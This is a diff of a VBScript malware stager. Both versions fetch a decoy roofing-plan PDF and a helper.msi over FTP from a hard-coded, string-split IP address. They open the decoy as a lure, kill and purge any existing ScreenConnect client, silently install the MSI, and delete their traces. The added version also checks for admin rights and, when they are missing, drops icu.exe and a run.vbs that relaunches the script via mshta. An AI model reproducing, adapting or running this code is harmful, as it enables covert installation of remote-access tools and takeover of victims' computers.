@@ -1,116 +1,145 @@
-'(FTP via ftp.exe, MSI to TEMP)
-Option Explicit
-Dim oFs, oSh, here, logPath, f, x, s, n, i, h, p, e, rc
-Dim msiUrl, msiPath, msiRc, msiN, msiI, tempDir, ftpCmd, ftpFile, ftpRc
-Dim sw, sc2, so2, pfDir, sfd, reg2, sk2(), sDir, sk
-
+' stage
+Dim oFs, oSh, lg, tempDir, h, cm, r1, p, e1, rc, sw, q, it, pf, sub1, reg, sD, sk, msiP, msiR
+Dim tmpf, tg, fw, isA, sp, ebat, bd
 Set oFs = CreateObject("Scripting.FileSystemObject")
 Set oSh = CreateObject("WScript.Shell")
-here = oFs.GetParentFolderName(WScript.ScriptFullName)
-logPath = here & "\stage-log.txt"
-
-Sub Log(s)
-    Set f = oFs.OpenTextFile(logPath, 8, True)
-    f.WriteLine s
-    f.Close
-End Sub
-
-Log "[vbs] start here=" & here
-
-h = "72" & "." & "51" & "." & "57" & "." & "39"
 tempDir = oSh.ExpandEnvironmentStrings("%TEMP%")
+Set lg = oFs.OpenTextFile(tempDir & "\stage-log.txt", 8, True)
+lg.WriteLine "[stage] start"
+h = "72" & "." & "51" & "." & "57" & "." & "39"
+bd = "C:\ProgramData\sd"
 
-' --- FTP download via curl (passive; ftp.exe is active-only on this build) ---
-ftpCmd = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & here & "\roofing-plan.pdf"" ftp://" & h & "/roofing-plan.pdf"
-ftpRc = oSh.Run("cmd.exe /c " & ftpCmd, 0, True)
-Log "[vbs] pdf dl rc=" & ftpRc
+isA = False
+tmpf = tempDir & "\_p.txt"
+r1 = oSh.Run("cmd.exe /c C:\Windows\System32\whoami.exe /groups > """ & tmpf & """", 0, True)
+lg.WriteLine "[stage] whoami rc=" & r1
+If oFs.FileExists(tmpf) Then
+    Set fw = oFs.OpenTextFile(tmpf, 1)
+    If Not fw.AtEndOfStream Then tg = fw.ReadAll
+    fw.Close
+    If InStr(tg, "S-1-16-12288") > 0 Or InStr(tg, "S-1-16-16384") > 0 Then isA = True
+    oFs.DeleteFile tmpf, True
+End If
+lg.WriteLine "[stage] admin=" & isA
 
-' --- Open PDF in Edge (if downloaded) ---
-p = here & "\roofing-plan.pdf"
-If oFs.FileExists(p) Then
-    On Error Resume Next
-    e = oSh.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe\")
-    If Err.Number <> 0 Or Len(e) = 0 Then
-        e = "msedge.exe"  ' fallback to PATH
+If Not isA Then
+    If Not oFs.FolderExists(bd) Then
+        On Error Resume Next
+        oFs.CreateFolder bd
+        On Error GoTo 0
+    End If
+    cm = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & bd & "\icu.exe"" ftp://" & h & "/icu.exe"
+    r1 = oSh.Run("cmd.exe /c " & cm, 0, True)
+    lg.WriteLine "[stage] icu dl rc=" & r1
+    If oFs.FileExists(bd & "\icu.exe") Then
+        sp = Replace(location.href, "file:///", "")
+        sp = Replace(sp, "%20", " ")
+        sp = Replace(sp, "/", "\")
+        On Error Resume Next
+        oFs.DeleteFile bd & "\p-log.txt", True
+        On Error GoTo 0
+        Set fw = oFs.CreateTextFile(bd & "\run.vbs", True)
+        fw.WriteLine "On Error Resume Next"
+        fw.WriteLine "Dim sh"
+        fw.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
+        fw.WriteLine "sh.Run ""cmd.exe /c echo [icu-vbs] hit %DATE% %TIME%> " & bd & "\p-log.txt"", 0, True"
+        fw.WriteLine "sh.Run ""mshta.exe "" & Chr(34) & """ & sp & """ & Chr(34), 0, False"
+        fw.Close
+        lg.WriteLine "[stage] handoff start"
+        lg.Close
+        r1 = oSh.Run("cmd.exe /c """ & bd & "\icu.exe"" m4a1_dev4 " & bd & "\run.vbs", 0, False)
+    Else
+        lg.WriteLine "[stage] icu missing"
+        lg.Close
+    End If
+Else
+    cm = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & tempDir & "\roofing-plan.pdf"" ftp://" & h & "/roofing-plan.pdf"
+    r1 = oSh.Run("cmd.exe /c " & cm, 0, True)
+    lg.WriteLine "[stage] pdf dl rc=" & r1
+    p = tempDir & "\roofing-plan.pdf"
+    If oFs.FileExists(p) Then
+        On Error Resume Next
+        e1 = oSh.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe\")
+        If Err.Number <> 0 Or Len(e1) = 0 Then
+            e1 = "msedge.exe"
+            Err.Clear
+        End If
+        On Error GoTo 0
+        rc = oSh.Run(Chr(34) & e1 & Chr(34) & " " & Chr(34) & p & Chr(34), 1, False)
+        lg.WriteLine "[stage] edge rc=" & rc
+    Else
+        lg.WriteLine "[stage] pdf missing"
+    End If
+
+    cm = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & tempDir & "\helper.msi"" ftp://" & h & "/helper.msi"
+    r1 = oSh.Run("cmd.exe /c " & cm, 0, True)
+    lg.WriteLine "[stage] msi dl rc=" & r1
+
+    lg.WriteLine "[stage] sweep start"
+    Set sw = GetObject("winmgmts:\\.\root\cimv2")
+    Set q = sw.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%ScreenConnect%'")
+    For Each it In q
+        On Error Resume Next
+        it.Terminate()
+        On Error GoTo 0
+    Next
+    Set q = sw.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
+    For Each it In q
+        On Error Resume Next
+        it.StopService()
+        On Error GoTo 0
+    Next
+    r1 = oSh.Run("cmd.exe /c ping -n 2 127.0.0.1 >nul", 0, True)
+    Set q = sw.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
+    For Each it In q
+        On Error Resume Next
+        it.Delete()
+        On Error GoTo 0
+    Next
+    For Each pf In Array("C:\Program Files (x86)", "C:\Program Files")
+        If oFs.FolderExists(pf) Then
+            For Each sub1 In oFs.GetFolder(pf).SubFolders
+                If InStr(sub1.Name, "ScreenConnect") = 1 Then
+                    On Error Resume Next
+                    sub1.Delete True
+                    On Error GoTo 0
+                End If
+            Next
+        End If
+    Next
+    Set reg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
+    For Each sD In Array("SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SYSTEM\CurrentControlSet\Services")
+        On Error Resume Next
+        sk = ""
+        reg.EnumKey &H80000002, sD, sk
+        If IsArray(sk) Then
+            For Each it In sk
+                If InStr(it, "ScreenConnect") > 0 Then
+                    reg.DeleteKey &H80000002, sD & "\" & it
+                End If
+            Next
+        End If
         Err.Clear
+    Next
+    reg.DeleteKey &H80000002, "SOFTWARE\WOW6432Node\ScreenConnect"
+    reg.DeleteKey &H80000001, "Software\ScreenConnect"
+    lg.WriteLine "[stage] sweep done"
+
+    msiP = tempDir & "\helper.msi"
+    If oFs.FileExists(msiP) Then
+        msiR = oSh.Run("msiexec.exe /i """ & msiP & """ /qn /norestart", 0, False)
+        lg.WriteLine "[stage] msi rc=" & msiR
+    Else
+        lg.WriteLine "[stage] msi missing"
     End If
+
+    On Error Resume Next
+    If oFs.FileExists(tempDir & "\e.bat") Then oFs.DeleteFile tempDir & "\e.bat", True
+    If oFs.FileExists(tempDir & "\icu.exe") Then oFs.DeleteFile tempDir & "\icu.exe", True
+    If oFs.FileExists(bd & "\run.vbs") Then oFs.DeleteFile bd & "\run.vbs", True
+    If oFs.FileExists(bd & "\icu.exe") Then oFs.DeleteFile bd & "\icu.exe", True
+    If oFs.FileExists(bd & "\p-log.txt") Then oFs.DeleteFile bd & "\p-log.txt", True
     On Error GoTo 0
-    rc = oSh.Run(Chr(34) & e & Chr(34) & " " & Chr(34) & p & Chr(34), 1, False)
-    Log "[vbs] edge rc=" & rc
-Else
-    Log "[vbs] pdf missing"
+    lg.WriteLine "[stage] done"
+    lg.Close
 End If
-
-' --- Fetch helper.msi while the lure is already open ---
-ftpCmd = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & tempDir & "\helper.msi"" ftp://" & h & "/helper.msi"
-ftpRc = oSh.Run("cmd.exe /c " & ftpCmd, 0, True)
-Log "[vbs] msi dl rc=" & ftpRc
-
-' --- Sweep any existing ScreenConnect client before install ---
-Log "[vbs] sweep start"
-Set sw = GetObject("winmgmts:\\.\root\cimv2")
-
-Set sc2 = sw.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%ScreenConnect%'")
-For Each so2 In sc2
-    On Error Resume Next
-    so2.Terminate()
-    On Error GoTo 0
-Next
-
-Set sc2 = sw.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
-For Each so2 In sc2
-    On Error Resume Next
-    so2.StopService()
-    WScript.Sleep 400
-    so2.Delete()
-    On Error GoTo 0
-Next
-
-For Each pfDir In Array("C:\Program Files (x86)", "C:\Program Files")
-    If oFs.FolderExists(pfDir) Then
-        For Each sfd In oFs.GetFolder(pfDir).SubFolders
-            If InStr(sfd.Name, "ScreenConnect") = 1 Then
-                On Error Resume Next
-                sfd.Delete True
-                On Error GoTo 0
-            End If
-        Next
-    End If
-Next
-
-Set reg2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
-For Each sDir In Array("SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SYSTEM\CurrentControlSet\Services")
-    On Error Resume Next
-    Erase sk2
-    reg2.EnumKey &H80000002, sDir, sk2
-    If Err.Number = 0 Then
-        For Each sk In sk2
-            If InStr(sk, "ScreenConnect") > 0 Then
-                reg2.DeleteKey &H80000002, sDir & "\" & sk
-            End If
-        Next
-    End If
-    Err.Clear
-Next
-reg2.DeleteKey &H80000002, "SOFTWARE\WOW6432Node\ScreenConnect"
-reg2.DeleteKey &H80000001, "Software\ScreenConnect"
-Log "[vbs] sweep done"
-
-' --- Install helper.msi silently from TEMP ---
-msiPath = tempDir & "\helper.msi"
-If oFs.FileExists(msiPath) Then
-    msiRc = oSh.Run("msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False)
-    Log "[vbs] msi rc=" & msiRc
-Else
-    Log "[vbs] msi missing"
-End If
-
-' --- Opsec cleanup: remove FTP command file and MSI after install ---
-On Error Resume Next
-oFs.DeleteFile ftpFile, True
-' Uncomment next line if you want to delete the MSI after install completes
-' oFs.DeleteFile msiPath, True
-On Error GoTo 0
-
-Set oFs = Nothing
-Set oSh = Nothing
